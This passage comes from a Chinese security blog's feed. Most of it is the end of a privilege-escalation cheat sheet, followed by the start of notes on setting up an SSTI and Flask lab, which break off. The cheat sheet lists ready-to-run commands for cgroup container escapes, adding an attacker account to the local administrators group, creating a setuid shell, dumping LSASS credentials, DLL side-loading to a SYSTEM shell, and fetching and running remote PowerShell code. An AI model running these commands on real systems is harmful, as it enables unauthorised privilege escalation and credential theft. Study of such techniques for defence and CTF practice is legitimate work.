href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv</a></p><h3 id="Dynamic-Phishing"><a href="#Dynamic-Phishing" class="headerlink" title="Dynamic Phishing"></a>Dynamic Phishing</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Mac</p><p>类型：  Phish</p><p>方法： </p><ul><li><code>https://github.com/thehappydinoa/rootOS</code></li><li><code>Python rootOS.py</code></li></ul><h3 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Race Condition</p><p>方法： </p><ul><li><code>echo “net localgroup administrators attacker /add” &gt; C:\temp\not-evil.bat</code></li><li><code>tempracer.exe C:\ temp\*.bat</code></li></ul><h3 id="Abusing-usermode-helper-API"><a href="#Abusing-usermode-helper-API" class="headerlink" title="Abusing usermode helper API"></a>Abusing usermode helper API</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Abusing Capabilities</p><p>方法： </p><pre class="line-numbers language-none"><code class="language-none">d&#x3D;&#96;dirname $(ls -x &#x2F;s*&#x2F;fs&#x2F;c*&#x2F;*&#x2F;r* |head -n1)&#96;mkdir -p $d&#x2F;w; echo 1 &gt; $d&#x2F;w&#x2F;notify_on_releaset&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;touch &#x2F;o; echo $t&#x2F;c &gt; $d&#x2F;release_agentecho “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;cecho “ps &gt; $t&#x2F;o” &gt;&gt; &#x2F;cchmod +x &#x2F;csh -c “echo 0 &gt; $d&#x2F;w&#x2F;cgroup.procs”; sleep 1cat &#x2F;o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Escape-only-with-CAP-SYS-ADMIN-capability"><a href="#Escape-only-with-CAP-SYS-ADMIN-capability" class="headerlink" title="Escape only with CAP_SYS_ADMIN capability"></a>Escape only with CAP_SYS_ADMIN capability</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Abusing Capabilities</p><p>方法： </p><pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o rdma cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;xecho 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_releasehost_path&#x3D;&#96;sed -n ‘s&#x2F;.*\perdir&#x3D;\([^,]*\).*&#x2F;\1&#x2F;p’ &#x2F;etc&#x2F;mtab&#96;echo “$host_path&#x2F;cmd” &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agentecho “#!&#x2F;bin&#x2F;sh” &gt; &#x2F;cmdecho “ps aux &gt; $host_path&#x2F;output” &gt;&gt; &#x2F;cmdchmod a+x &#x2F;cmdsh -c “echo \$\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs”cat &#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Abusing-exposed-host-directories"><a href="#Abusing-exposed-host-directories" class="headerlink" title="Abusing exposed host directories"></a>Abusing exposed host directories</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Abusing Capabilities</p><p>方法： </p><ul><li><code>mknod /dev/sdb1 block 8 17</code></li><li><code>mkdir /mnt/host_home</code></li><li><code>mount /dev/sdb1 /mnt/host_home</code></li><li><code>echo ‘echo “Hello from container land!” 2&gt;&amp;1’ &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</code></li></ul><h3 id="Unix-Wildcard"><a href="#Unix-Wildcard" class="headerlink" title="Unix Wildcard"></a>Unix Wildcard</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Injection</p><p>方法： </p><ul><li><code>python wildpwn.py –file /tmp/very_secret_file combined ./pwn_me/</code></li></ul><h3 id="Socket-Command-Injection"><a href="#Socket-Command-Injection" class="headerlink" title="Socket Command Injection"></a>Socket Command Injection</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Injection</p><p>方法： </p><ul><li><code>echo “cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;” | socat – UNIX-CLIENT:/tmp/socket_test.s</code></li></ul><h3 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Injection</p><p>方法： </p><ul><li><p><code>/etc/logstash/logstash.yml</code></p><pre class="line-numbers language-none"><code class="language-none">input &#123;exec &#123;           command &#x3D;&gt; “whoami”           interval &#x3D;&gt; 120           &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="UsoDllLoader"><a href="#UsoDllLoader" class="headerlink" title="UsoDllLoader"></a>UsoDllLoader</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Injection</p><p>方法： </p><ul><li><code>UsoDllLoader.exe</code></li></ul><p>批注：<a href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824">https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824</a></p><h3 id="Trend-Chain-Methods-for-Privilege-Escalation"><a href="#Trend-Chain-Methods-for-Privilege-Escalation" class="headerlink" title="Trend Chain Methods for Privilege Escalation"></a>Trend Chain Methods for Privilege Escalation</h3><h3 id="Habanero-Chilli"><a href="#Habanero-Chilli" class="headerlink" title="Habanero Chilli"></a>Habanero Chilli</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Dll Side-loading</p><p>方法： </p><ul><li><code>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</code></li></ul><h3 id="Padron-Chilli"><a href="#Padron-Chilli" class="headerlink" title="Padron Chilli"></a>Padron Chilli</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p><p>方法： </p><ul><li><code>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</code></li></ul><h3 id="Jalapeno-Chillies"><a href="#Jalapeno-Chillies" class="headerlink" title="Jalapeno Chillies"></a>Jalapeno Chillies</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>方法：  unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p><p>方法： </p><ul><li><code>NihilistGuy.exe</code></li></ul><p>批注：<a href="https://github.com/analyticsearch/NihilistGuy">https://github.com/analyticsearch/NihilistGuy</a></p><h3 id="Pasilla-Chili"><a href="#Pasilla-Chili" class="headerlink" title="Pasilla Chili"></a>Pasilla Chili</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>方法：  SeImpersonatePrivilege + Abusing Service Account Session</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>Demo5.ps1</code></li></ul><h3 id="Finger-Chilli"><a href="#Finger-Chilli" class="headerlink" title="Finger Chilli"></a>Finger Chilli</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Abusing PrintNotify Service + DLL side-loading</p><p>方法： </p><ul><li><code>以管理员身份，将winspool.drv和mod-ms-win-core-apiquery-l1-1-0.dll复制到C:\Windows\System32\spool\drivers\x64\3\</code></li><li><code>将 /bin/ 中包含的所有文件放入同一目录中。</code></li><li><code>然后，运行 powershell .\spooltrigger.ps1。</code></li><li>享受 NT AUTHORITY\SYSTEM 的 shell。</li></ul><h3 id="Orange-Cayenne"><a href="#Orange-Cayenne" class="headerlink" title="Orange Cayenne"></a>Orange Cayenne</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Silver Ticket + I Know</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>Demo1.ps1</code></li></ul><h3 id="Red-Cayenne"><a href="#Red-Cayenne" class="headerlink" title="Red Cayenne"></a>Red Cayenne</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Silver ticket + User to User Authentication</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>demo2.ps1</code></li></ul><h3 id="Birds-Eye-Chilli"><a href="#Birds-Eye-Chilli" class="headerlink" title="Birds Eye Chilli"></a>Birds Eye Chilli</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Silver Ticket + Buffer Type Confusion</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>Demo3.ps1</code></li></ul><h3 id="Scotch-Bonnet"><a href="#Scotch-Bonnet" class="headerlink" title="Scotch Bonnet"></a>Scotch Bonnet</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Bring Your Own KDC</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>Demo4.ps1</code></li></ul><h3 id="Lemon-Habanero"><a href="#Lemon-Habanero" class="headerlink" title="Lemon Habanero"></a>Lemon Habanero</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Capabilities</p><p>方法： </p><ul><li><code>gcc -Wl,–no-as-needed -lcap-ng -o ambient ambient.c</code></li><li><code>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</code></li><li><code>./ambient /bin/bash</code></li></ul><p>批注：<a href="https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw">https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw</a></p><h3 id="Red-Habanero"><a href="#Red-Habanero" class="headerlink" title="Red Habanero"></a>Red Habanero</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  NtSetInformationProcess + DLL side-loading</p><p>方法： </p><ul><li><code>BypassRtlSetProcessIsCritical.exe pid</code></li></ul><p>批注：没找到这个东西</p><h3 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p><p>方法： </p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token variable">$code</span> = <span class="token punctuation">(</span><span class="token function">iwr</span> https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com/usdAG/SharpLink/main/SharpLink<span class="token punctuation">.</span>cs<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token function">PS</span> C:\> <span class="token function">Add-Type</span> <span class="token variable">$code</span>                                                                                          <span class="token function">PS</span> C:\> <span class="token variable">$s</span> = <span class="token function">New-Object</span> de<span class="token punctuation">.</span>usd<span class="token punctuation">.</span>SharpLink<span class="token punctuation">.</span>Symlink<span class="token punctuation">(</span>“C:\Users\Public\Example\link”<span class="token punctuation">,</span> “C:\ProgramData\target<span class="token punctuation">.</span>txt”<span class="token punctuation">)</span><span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">PS</span> C:\> <span class="token function">echo</span> “Hello World :D” > C:\Users\Public\Example\link<span class="token function">PS</span> C:\> <span class="token function">type</span> C:\ProgramData\target<span class="token punctuation">.</span>txtHello World 😀<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Chocolate-Scorpion-Chilli"><a href="#Chocolate-Scorpion-Chilli" class="headerlink" title="Chocolate Scorpion Chilli"></a>Chocolate Scorpion Chilli</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Directory-Deletion + Windows Media Player d&#x2F;s</p><p>方法： </p><ul><li><code>https://github.com/sailay1996/delete2SYSTEM</code></li><li><code>.\poc.ps1</code></li></ul><h3 id="Carolina-Reaper"><a href="#Carolina-Reaper" class="headerlink" title="Carolina Reaper"></a>Carolina Reaper</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Creates an arbitrary service + PTH</p><p>方法： </p><ul><li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li><li><code>Demo6.ps1</code></li></ul><h3 id="The-Intimidator-Chilli"><a href="#The-Intimidator-Chilli" class="headerlink" title="The Intimidator Chilli"></a>The Intimidator Chilli</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  manipulate memory&#x2F;process token values&#x2F;NT system calls and objects&#x2F;NT object manager</p><p>方法： </p><ul><li><code>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</code></li><li><code>Import-Module NtObjectManager</code></li><li><code>Get-ChildItem NtObject:\</code></li><li><code>NT*</code></li></ul><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>摘选自[117种提权方法](<a href="https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HO1gV2WjX-cxpRTeHgkYW7opx01zPy6NqCBn2xA7&target_url=https://mp.weixin.qq.com/s/mqJ6rcFeKtCze0F5GN257Q">微信公众平台 (qq.com)</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="知识点" scheme="http://3143047748.github.io/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SSTI漏洞总结学习</title>
    <link href="http://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/"/>
    <id>http://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-11-15T09:58:43.000Z</published>
    <updated>2023-11-20T13:39:35.480Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>观看B站教学视频<a href="https://www.bilibili.com/video/BV1tj411u7Bx/?spm_id_from=333.999.0.0">重庆橙子科技</a> 的笔记，个人认为质量很好，记录一下。</p><h2 id="靶场部署"><a href="#靶场部署" class="headerlink" title="靶场部署"></a>靶场部署</h2><h3 id="docker地址"><a href="#docker地址" class="headerlink" title="docker地址"></a>docker地址</h3><p>mcc0624&#x2F;flask_ssti:last</p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>前提是你服务器已经安装了docker，还有提一点，注意云服务器安全组的配置<br>拉取镜像</p><blockquote><p>docker pull mcc0624&#x2F;flask_ssti:last</p></blockquote><p><strong>查看镜像</strong><br><img src="https://img-blog.csdnimg.cn/7c2275fe3e05482bbfcb703c1fd5cd66.png" alt="123"><br>此时已经拉取到本地</p><blockquote><p>指定端口运行容器并且进入命令行<br><code>docker run -p 18022:80 -i -t mcc0624/flask_ssti:last bash -c &#39;/etc/rc.local; /bin/sh&#39;</code></p></blockquote><p>开启&#x2F;关闭容器</p><blockquote><p>开启<br>docker run -p 8888:80 -t mcc0624&#x2F;flask_ssti:last<br>关闭<br>docker stop imageid</p></blockquote><h2 id="Python-venv"><a href="#Python-venv" class="headerlink" title="Python venv"></a>Python venv</h2><p>可以把它想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的(就像你在Windows主机上通过Vmware跑一台Ubuntu或者CentOS的虚拟主机一样)，也就是说你在venv下通过pip安装的Python第三方模块是不会存在于你本机的环境下的。</p><h3 id="安装venv"><a href="#安装venv" class="headerlink" title="安装venv"></a>安装venv</h3><blockquote><p>apt install python3-venv</p></blockquote><p>创建venv环境安装flask<br>进入&#x2F;opt目录，运行命令：</p><blockquote><p>python3 -m venv flask1<br>cd fl*<br>l<br>这里包含python虚拟环境的组件<br><img src="https://img-blog.csdnimg.cn/f544a20f541b42eea056ad0d2589e719.png" alt="1"></p></blockquote><p>此时咱们在&#x2F;opt目录创建一个文件demo.py<br>然后执行文件</p><blockquote><p>python3 demo.py<br><img src="https://img-blog.csdnimg.cn/7a1cb258217d4db0b691dae1a8d34312.png" alt="123"></p></blockquote><p>请注意，这里使用的物理主机的python环境执行的，那么我们如何使用虚拟的python环境来执行这个文件呢？</p><blockquote><p>执行flask1路径下的python<br><img src="https://img-blog.csdnimg.cn/36ecf712be56493d8eef85062c3b2bd8.png" alt="123"></p></blockquote><p>这时就是用虚拟的python环境执行该文件<br>当然还可以这样</p><blockquote><p>cd flask1<br>进入虚拟环境<br>source .&#x2F;bin&#x2F;activate<br>退出虚拟环境<br>dactivate</p></blockquote><h2 id="虚拟环境下安装flask以及应用"><a href="#虚拟环境下安装flask以及应用" class="headerlink" title="虚拟环境下安装flask以及应用"></a>虚拟环境下安装flask以及应用</h2><p><strong>安装</strong></p><blockquote><p>pip install flask</p></blockquote><p><strong>应用</strong></p><blockquote><p>vim demo.py</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flaskapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"hello benben"</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候默认端口为5000<br>如果你想要改变端口那就修改文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flaskapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"hello benben"</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要开启debug模式，只需加上<code>debug=True</code></p><h3 id="Flask变量规则"><a href="#Flask变量规则" class="headerlink" title="Flask变量规则"></a>Flask变量规则</h3><p>通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为<variable-name>。它作为关键字参数传递给与规则相关联的函数。</p><p>在以下示例中，route()装饰器的规则参数包含附加到URL ‘&#x2F;hello’的<name>。因此，如果在浏览器中输入<a href="http://localhost:5000/hello/w3cschool%E4%BD%9C%E4%B8%BAURL%EF%BC%8C%E5%88%99&#39;w3cschool&#39;%E5%B0%86%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E6%8F%90%E4%BE%9B%E7%BB%99hello()%E5%87%BD%E6%95%B0%E3%80%82">http://localhost:5000/hello/w3cschool作为URL，则&#39;w3cschool&#39;将作为参数提供给hello()函数。</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/b34afe36bbf44367b590efa57654ec49.png" alt="123"><br>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：<br><img src="https://img-blog.csdnimg.cn/33c6bdc86942423798ca61af1cc428a2.png" alt="1"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blog/&lt;int:postID>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_blog</span><span class="token punctuation">(</span>postID<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Blog Number %d'</span> <span class="token operator">%</span> postID <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rev/&lt;float:revNo>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">revision</span><span class="token punctuation">(</span>revNo<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Revision Number %f'</span> <span class="token operator">%</span> revNo <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h3><p><img src="https://img-blog.csdnimg.cn/e76311f64df0491b84805ff582c04d5a.png" alt="123"></p><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>GET方法用于从服务器获取数据。它没有请求体，所有参数都包含在URL中。在Flask中，我们可以使用route装饰器来定义GET路由。例如，以下代码演示如何定义一个简单的GET路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username>'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello,%s!'</span><span class="token operator">%</span> username<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/5e9f57615db7473e9484adf03b5943a3.png" alt="123"></p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>POST方法用于向服务器提交数据。在Flask中，我们可以通过route装饰器将POST路由关联到视图函数。以下是一个简单的POST路由的示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    json_data<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    name<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    email<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">'User created successfully'</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/4c4bda8917ad457b8be45f8e97bb41e4.png" alt="123"></p><h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUT方法用于向服务器更新数据。在Flask中，我们可以通过route装饰器将PUT路由关联到视图函数。以下是一个简单的PUT路由示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_user</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    email <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token comment"># ... code to update user ...</span>    <span class="token keyword">return</span> <span class="token string">'User updated successfully'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/bc07498f2db246ac8a70637a9a6cb6b2.png" alt="456"></p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETE方法用于从服务器删除数据。在Flask中，我们可以通过route装饰器将DELETE路由关联到视图函数。以下是一个简单的DELETE路由示例：</p><pre 